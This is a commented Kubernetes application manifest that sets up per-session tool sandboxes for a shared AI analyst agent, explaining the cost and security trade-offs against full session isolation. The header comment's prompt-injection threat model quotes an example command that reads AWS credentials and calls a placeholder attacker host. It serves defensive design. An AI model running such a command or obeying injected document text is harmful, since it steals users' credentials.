# Per-session TOOL isolation — the recommended first step, and the one most
# agents should actually use.
#
# `isolation: session` (example-agent-session-isolation.yaml) gives every session
# its own agent instance. That is the strongest tier and the most expensive one:
# a microVM per concurrent session, holding a whole agent process whether it is
# computing or waiting on the model.
#
# `isolation: tools` buys most of the security for a fraction of that. The agent
# loop stays SHARED -- one process, one model connection, memory and context
# already isolated per caller (#66) -- and only the dangerous part moves into a
# per-session sandbox: code execution, the filesystem, the browser. A sandbox
# exists while a tool runs and is released afterwards, so N concurrent users do
# not mean N resident VMs.
#
# WHY THIS IS THE RIGHT DEFAULT FOR MOST AGENTS. The prompt-injection blast
# radius is not the agent loop; it is the place where model-generated text turns
# into execution. A poisoned document that convinces an agent to run
# `cat ~/.aws/credentials && curl evil.example` is dangerous because something
# RUNS it. Put the boundary there and the injection still happens -- it just
# lands in a disposable microVM holding one user's files, with no credentials and
# no route to anything that matters.
#
# What `tools` does NOT give you, and `session` does:
#   - The agent process itself is shared. A bug in the agent that leaks state
#     between callers is still possible; the memory and context separation from
#     #66 is what bounds it, not a VM.
#   - Nothing isolates the model conversation. Two users' prompts pass through
#     one process.
# Use `session` when the agent PROCESS being shared is itself the finding --
# regulated data, hard multi-tenancy, an AgentCore-Runtime-equivalent guarantee.
#
# PRECONDITIONS (identical to the session tier)
#   1. enable_agent_sandbox: true -- the operator is the only source of the
#      SandboxTemplate / SandboxWarmPool / SandboxClaim CRDs.
#   2. session_isolation: "true" on the cluster secret, AND an agent image that
#      claims a sandbox per session. Without both, this Application is rejected
#      at admission rather than deployed as a shared agent that pretends
#      otherwise.
#   3. A Nitro-capable cluster (Kubernetes 1.36+), or one annotated onto Kata.
#      Nothing here names either.
apiVersion: core.oam.dev/v1beta1
kind: Application
metadata:
  name: analyst-tools-isolated
  namespace: default
spec:
  components:
    # ── The agent: ONE shared process, for every user ────────────────────────
    - name: report-analyst
      type: agent
      properties:
        description: "Answers questions over uploaded documents; runs code per session"
        systemMessage: |
          You are an analyst. Use the code interpreter for any calculation or
          file manipulation. Never guess a number you could compute.
        modelConfig:
          modelId: claude-sonnet

        # ── The tier ────────────────────────────────────────────────────────
        # The agent loop is shared. Code execution, the filesystem and the
        # browser are claimed per session from the pool below and released on
        # idle.
        #
        # NOTE WHAT IS *NOT* SANDBOXED HERE: this pod. It is an ordinary
        # shared-kernel container, because `sandbox: true` is absent. That is the
        # deliberate shape of this tier -- you are paying for isolation exactly
        # where untrusted code runs, and nowhere else.
        #
        # The two are independent and can be combined: `sandbox: true` with
        # `isolation: tools` puts the shared agent in its own microVM AND gives
        # each session its own tool sandbox. That is the right answer when the
        # agent handles untrusted INPUT as well as running untrusted code.
        isolation: tools
        sandboxTemplate: analyst-tools

        # What counts as one session, and therefore one tool sandbox. The default
        # (gateway subject + A2A contextId) means a user's two conversations get
        # two sandboxes -- so a file written in one is not visible in the other.
        #
        # Set `subject` instead when a user's conversations SHOULD share a
        # workspace: an analyst uploading a dataset in one thread and querying it
        # in another. Cheaper too, since one sandbox serves all their threads.
        sessionKey: subject+context

        # Safe here in a way it is not for a single-replica agent: with tool
        # execution out of the pod, these replicas are doing orchestration, so
        # they scale on request volume rather than on workspace size. The usual
        # caveat still applies to the SHARED agent's own session cache -- pair
        # multiple replicas with a memory provider.
        replicas: 2

        registerWithGateway: true
      traits:
        # One identity for both jobs: the trait attaches the projected gateway
        # token to the same ServiceAccount that the claim RBAC this tier renders
        # is bound to.
        - type: gateway-identity

    # ── The tool sandbox: claimed per session, released on idle ──────────────
    - name: analyst-tools
      type: sandbox
      properties:
        description: "Per-session code execution and workspace for report-analyst"

        # Replace with your interpreter image. It must run as a NUMERIC non-root
        # uid, or accept the component's runAsUser default of 1000.
        image: public.ecr.aws/docker/library/python:3.12-slim

        # Warm instances boot BEFORE a claim injects per-session env, so the
        # image idles here and the claimer execs the real entrypoint on bind.
        command: ["sleep", "infinity"]

        # Nitro isolated-sandbox by default -- a microVM per instance, its own
        # kernel, hardware-isolated memory. Not written out; it is the default.
        # mode: isolated

        # ── Pool sizing for the tools tier ──────────────────────────────────
        # This is the number that makes `tools` cheap, and it is sized
        # differently from the session tier: a tool sandbox lives for the length
        # of a TOOL CALL, not a conversation, so the pool covers concurrent tool
        # EXECUTIONS -- normally a small fraction of concurrent users, because
        # most of a session is spent waiting on the model.
        #
        # Start small and watch SandboxWarmPool readyReplicas against claim
        # latency. Over-provisioning here is the one way this tier stops being
        # cheaper than `session`.
        warmPool: 2

        # Short, because these are reclaimed between tool calls rather than held
        # for a conversation. maxLifetime is the backstop for an instance whose
        # claim leaked.
        idleTimeout: 5m
        maxLifetime: 1h

        # The agent drives this over HTTP, so the claimed instance needs a
        # Service.
        #
        # STRONGER OPTION, NOT YET WIRED: networkIsolated: true boots the sandbox
        # with no network device at all -- no DNS, no IMDS, no Pod Identity,
        # nothing routable -- which is strictly better than an egress
        # NetworkPolicy for running model-written code, because the device is
        # ABSENT rather than filtered. It requires service: false and driving the
        # instance over exec/stdin, and the agent component does not grant
        # pods/exec RBAC today. Tracked as a follow-up rather than offered here
        # as an option that would not work.
        service: true
        ports:
          - name: http
            containerPort: 8080

        # Per instance. Sized for a code interpreter rather than an agent: CPU
        # matters during a computation, and the workspace is where uploaded files
        # land. The RuntimeClass adds 256Mi and one
        # eks.amazonaws.com/nitro-sandbox slot on top.
        resources:
          requests:
            cpu: "1"
            memory: 1Gi
          limits:
            cpu: "2"
            memory: 2Gi

        # The per-session workspace. Ephemeral and per instance, so one session's
        # files are not merely hidden from another session -- they are in a
        # different VM's filesystem, and they are gone when the claim is
        # released.
        workspacePath: /workspace
        workspaceSizeGi: 4
